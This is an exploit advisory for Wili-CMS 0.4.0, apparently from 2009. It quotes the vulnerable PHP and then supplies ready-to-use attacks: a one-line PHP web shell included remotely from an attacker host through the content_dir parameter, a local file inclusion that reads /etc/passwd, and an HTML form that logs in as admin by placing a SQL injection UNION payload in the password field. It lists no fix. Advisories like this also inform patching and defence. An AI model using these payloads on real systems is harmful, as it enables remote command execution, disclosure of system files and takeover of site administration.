Wili-CMS 0.4.0 (RFI/LFI/AB) Multiple Remote Vulnerabilities
===========================================================


*******   Salvatore "drosophila" Fresta   *******

[+] Application: Wili-CMS
[+] Version: 0.4.0
[+] Website: http://wili-cms.sourceforge.net/

[+] Bugs: [A] Multiple Remote/Local File Inclusion
          [B] Authentication Bypass

[+] Exploitation: Remote
[+] Date: 06 Mar 2009

[+] Discovered by: Salvatore "drosophila" Fresta

*************************************************

[+] Menu

1) Bugs
2) Code
3) Fix


*************************************************

[+] Bugs


- [A] Multiple Remote/Local File Inclusion

[-] Requisites: none
[-] File affected: index.php

This bug allows a guest to include remote and
local files and however to exec remote commands.

...

if ( $globals[&#039;dbh&#039;] && !pageExists( $globals[&#039;pageid&#039;][&#039;pid&#039;] ) ) {
    include( $globals[&#039;content_dir&#039;].$globals[&#039;template_dir&#039;]."error404.php" );
}

...

include( template_file( $globals[&#039;root_template&#039;] ) );


- [B] Authentication Bypass

[-] Requisites: magic_quotes_gpc = off
[-] File affected: lib/admin/init_session.php

This bug allows a guest to login as admin.

...

$_SESSION[&#039;password&#039;] = $_REQUEST[&#039;password&#039;] ? $_REQUEST[&#039;password&#039;]
: $_SESSION[&#039;password&#039;];
$globals[&#039;username&#039;] = $_SESSION[&#039;uname&#039;] = $_REQUEST[&#039;uname&#039;] ?
$_REQUEST[&#039;uname&#039;] : $_SESSION[&#039;uname&#039;];

...

$sth = mysql_query(
       "SELECT id
        FROM ".$globals[&#039;userstable&#039;]."
        WHERE username=&#039;".$_SESSION[&#039;uname&#039;]."&#039;
        AND adminflag=1
        AND password=PASSWORD(&#039;".$_SESSION[&#039;password&#039;]."&#039;)", $globals[&#039;dbh&#039;] );

      // password ok -> login
if ( mysql_num_rows( $sth ) && ( $globals[&#039;uid&#039;] = mysql_result($sth,0) ) ) {
	$globals[&#039;user&#039;] = mysql_result( $userh = mysql_query( "SELECT id,
skipwelcome FROM ".$globals[&#039;userstable&#039;]." WHERE
username=&#039;".$globals[&#039;username&#039;]."&#039;", $globals[&#039;dbh&#039;] ),0,0);

    if ( $globals[&#039;admin_modus&#039;] == "loggedin" ) {
         // log login
         db_addlog( "Logged in from ".getenv("REMOTE_ADDR") );
         // goto welcome page if skipwelcome flag of this user is not set
         if ( !(mysql_result( $userh, 0, 1 )) ) {
           $_REQUEST[&#039;npage&#039;] = get_firstpage( "adminwelcome" );
         }
         $globals[&#039;admin_modus&#039;] = "";
    }

    ...


*************************************************

[+] Code


- [A] Multiple Remote/Local File Inclusion

shell.txt: <?php system($_GET[&#039;cmd&#039;]); ?>

http://www.site.com/path/?npage=-1&content_dir=http://www.evilsite.com/shell.txt%00&cmd=ls
http://www.site.com/path/?npage=1&content_dir=http://www.evilsite.com/shell.txt%00&cmd=ls

http://www.site.com/path/?npage=-1&content_dir=../../../../etc/passwd%00
http://www.site.com/path/?npage=1&content_dir=../../../../etc/passwd%00


- [B] Authentication Bypass

<html>
  <head>
    <title>Wili-CMS 0.4.0 Authentication Bypass Exploit</title>
  </head>
  <body>
    <form action="http://www.site.com/path/admin.php" method="POST">
      <input type="text" name="uname" value="admin">
      <input type="hidden" name="password" value="1&#039;) UNION ALL SELECT 1#">
      <input type="hidden" name="mode" value="loggedin">
      <input type="hidden" name="npage" value="1">
      <input type="submit" value="Exploit">
    </form>
  </body>
</html>


*************************************************

[+] Fix

No fix.


*************************************************



